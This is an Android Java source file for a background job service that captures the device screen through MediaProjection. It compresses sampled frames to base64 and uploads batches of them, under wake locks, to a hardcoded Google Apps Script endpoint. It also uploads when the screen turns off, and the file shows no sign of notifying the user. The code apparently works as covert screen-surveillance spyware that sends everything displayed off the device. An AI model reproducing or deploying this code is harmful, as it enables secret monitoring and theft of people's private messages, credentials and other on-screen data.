package app.marees.mars;


import android.annotation.SuppressLint;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.OrientationEventListener;
import android.view.WindowManager;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import app.marees.mars.Receiver.ScreenReceiver;
import app.marees.mars.Singletons.Myapp;
import app.marees.mars.Singletons.Singleton;

public class ScreenshotAct extends JobService implements availabletoAct {

    private static final String TAG = "ScreenshotAct";
    private boolean jobCanceled = false;
    private static int IMAGES_PRODUCED;
    private static final String SCREENCAP_NAME = "screencap";
    private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    private static MediaProjection sMediaProjection;
    private MediaProjectionManager mProjectionManager;
    private ImageReader mImageReader;
    private Handler mHandler;
    private Display mDisplay;
    private VirtualDisplay mVirtualDisplay;
    private int mDensity;
    private int mWidth;
    private int mHeight;
    int total = 0;
    private int mRotation;
    boolean isUploading = false;
    private OrientationChangeCallback mOrientationChangeCallback;
    private Bitmap Latest;
    JSONArray ImageString = new JSONArray();
    public JobParameters universalParam;
    WindowManager window;
    RequestQueue mqueue;
    BroadcastReceiver myreceiver = null;


    @SuppressLint("InvalidWakeLockTag")
    @Override
    public boolean onStartJob(JobParameters params) {
        universalParam = params;


        sMediaProjection = Myapp.getScreenshotPermission();
        myreceiver = new ScreenReceiver();
        final IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        registerReceiver(myreceiver, filter);
        return true;
    }


    @Override
    public boolean onStopJob(JobParameters params) {

        if(mHandler == null){

            createHandler();
        }

        mHandler.post(new Runnable() {
            @Override
            public void run() {
                IMAGES_PRODUCED = 0;

                Log.e(TAG,"Job Finished");
                jobFinished(params,false);
                if (sMediaProjection != null) {
                    sMediaProjection.stop();

                }
            }
        });



        // start capture handling thread
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                mHandler = new Handler();
                Looper.loop();
            }
        }.start();

        if(myreceiver != null){
            unregisterReceiver(myreceiver);
            Log.e("","Receiver stopped");
            myreceiver = null;
        }

        Log.e(TAG,"Job Cancelled before Completion");
        jobCanceled = true;
        return true;

    }

    ///////interfaceeeeee
    @Override
    public void getShot() {

        mqueue = Singleton.getInstance(Myapp.getAppContext()).getRequestQueue();
        mProjectionManager = (MediaProjectionManager) Myapp.getAppContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        window = (WindowManager) Myapp.getAppContext().getSystemService(Context.WINDOW_SERVICE);
        JobParameters UniversalParam2 = universalParam;
        Log.e(TAG,"Job Started");
        sMediaProjection =Myapp.getScreenshotPermission();

        // start capture handling thread
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                mHandler = new Handler();
                Looper.loop();
            }
        }.start();
        Myapp.setHandler(mHandler);



        startProjection();

    }




    ////////prepare for dispaly metrics calculation

    private void startProjection() {


        // display metrics
        DisplayMetrics metrics = Myapp.getAppContext().getResources().getDisplayMetrics();
        mDensity = metrics.densityDpi;
        mDisplay = window.getDefaultDisplay();
        sMediaProjection = Myapp.getScreenshotPermission();

        // create virtual display depending on device width / height
        createVirtualDisplay();

        // register orientation change callback
        mOrientationChangeCallback = new OrientationChangeCallback(this);
        if (mOrientationChangeCallback.canDetectOrientation()) {
            mOrientationChangeCallback.enable();
        }

        // register media projection stop callback
        sMediaProjection.registerCallback(new MediaProjectionStopCallback(), mHandler);
    }



    /****************************************** Factoring Virtual Display creation ****************/
    private void createVirtualDisplay() {
        // get width and height
        Point size = new Point();
        mDisplay.getSize(size);
        mWidth = size.x;
        mHeight = size.y;

        // start capture reader
        mImageReader = ImageReader.newInstance(mWidth, mHeight, PixelFormat.RGBA_8888, 2);


        // Log.e("",sMediaProjection.toString());
        if(Myapp.getVirtualDisplay() == null){
//            try {
                mVirtualDisplay = sMediaProjection.createVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, VIRTUAL_DISPLAY_FLAGS, mImageReader.getSurface(), null, mHandler);
                Myapp.setVirtualDisplay(mVirtualDisplay);
                Log.e("SCREENSHOTACT", "Virtual display null..");
                Log.e("SCREENSHOTACT", "Successfully added virtual display");
//            }
//            catchjh
        }
        else{
            Log.e("SCREENSHOTACT","Reusing added virtual display");
            mVirtualDisplay = Myapp.getVirtualDisplay();
        }

        mImageReader.setOnImageAvailableListener(new ImageAvailableListener(), mHandler);
    }



    private void stopProjection() {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                if (sMediaProjection != null) {
                    sMediaProjection.stop();
                }
            }
        });
    }







    @SuppressLint("InvalidWakeLockTag")
    private void sendtoDrive(JSONArray String) {
        PowerManager pm;
        PowerManager.WakeLock wl;
        pm = (PowerManager) Myapp.getAppContext().getSystemService(Context.POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Marees");

        wl.acquire(10*60*1000L /*10 minutes*/);


        //stopProjection();
       // stopProjection();
        ImageAvailableListener img = new ImageAvailableListener();
        mqueue = Singleton.getInstance(Myapp.getAppContext()).getRequestQueue();
        String url = "https://script.google.com/macros/s/AKfycbw9uMhUausfVngikSLzXLXQHbVTRdTsC0aFJIJ5nLQcqifm6Xs/exec";
        JSONObject js = new JSONObject();
        try {
            js.put("Screens",String);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        JsonObjectRequest myRequest = new JsonObjectRequest(Request.Method.POST, url, js, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {

                ImageString = new JSONArray();
                isUploading = false;
                wl.release();
                Log.e("","Remaining send"+total);
                total = 0;
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                ImageString = new JSONArray();
                isUploading = false;
               wl.release();
                Log.e("","Remaining send"+total);
                total = 0;

            }
        });

        myRequest.setRetryPolicy(new DefaultRetryPolicy(
                50000,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

        mqueue.add(myRequest);

    }





    private void createHandler() {

        mHandler = new Handler();
    }


    ///////////image listener

   public class ImageAvailableListener implements ImageReader.OnImageAvailableListener,screenListener {

        @SuppressLint("InvalidWakeLockTag")
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = null;
            FileOutputStream fos = null;
            Bitmap bitmap = null;
            boolean runOnce = true;

            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * mWidth;

                    // create bitmap
                    bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    Latest = bitmap;

// write bitmap to a file
                    //       fos = new FileOutputStream(STORE_DIRECTORY + "/myscreen_" + IMAGES_PRODUCED + ".png");
                    //      bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                    if((IMAGES_PRODUCED % 10 ) == 0){

                        Log.e("",IMAGES_PRODUCED+"");
                      //  Bitmap bitmap2 = BitmapFactory.(bitmap);
                        bitmap =Bitmap.createScaledBitmap(bitmap,720,1280,true);
                        String encoded = bitmapCompressor(bitmap);

                        ImageString.put(encoded);

                        Myapp.setMyJS(ImageString);
                      //  sendtoDrive( ImageString);
                        if(!isUploading){
                            isUploading = true;
                            sendtoDrive(ImageString);
                        }

                        Log.e("","");

                    }



                    IMAGES_PRODUCED++;

                    if(IMAGES_PRODUCED > 1000){


                        if(!isUploading){
                            stopProjection();
                            isUploading = true;
                            sendtoDrive(ImageString);
                        }



                    }else{


                    }


                    Log.e(TAG, "captured image: " + IMAGES_PRODUCED);
                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }

                if (bitmap != null) {
                    bitmap.recycle();
                }

                if (image != null) {
                    image.close();
                }
            }
        }



        @SuppressLint("InvalidWakeLockTag")
        @Override
        public void ScreenOff() {


                if(mHandler == null){
                    createHandler();
                }
                ImageString = Myapp.getMyjs();

                PowerManager pm;
                PowerManager.WakeLock wl;
                pm = (PowerManager) Myapp.getAppContext().getSystemService(Context.POWER_SERVICE);
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Marees");

                wl.acquire(10*60*1000L /*10 minutes*/);

                if(!isUploading){
                    isUploading = true;
                    sendtoDrive(ImageString);
                }

 }
    }







    public  String bitmapCompressor(Bitmap myBit){


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        myBit.compress(Bitmap.CompressFormat.WEBP, 10, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream .toByteArray();
        String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);

        return encoded;

    }
    private class OrientationChangeCallback extends OrientationEventListener {

        OrientationChangeCallback(Context context) {
            super(Myapp.getAppContext());
        }

        @Override
        public void onOrientationChanged(int orientation) {
            final int rotation = mDisplay.getRotation();
            if (rotation != mRotation) {
                mRotation = rotation;
                try {
                    // clean up
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);

                    // re-create virtual display depending on device width / height
                    createVirtualDisplay();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }



    private class MediaProjectionStopCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            Log.e("ScreenCapture", "stopping projection.");
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);
                    if (mOrientationChangeCallback != null) mOrientationChangeCallback.disable();
                    sMediaProjection.unregisterCallback(MediaProjectionStopCallback.this);
                }
            });
        }
    }






}
interface availabletoAct{

    public void getShot();

}
interface  screenListener{

    public void ScreenOff();

}
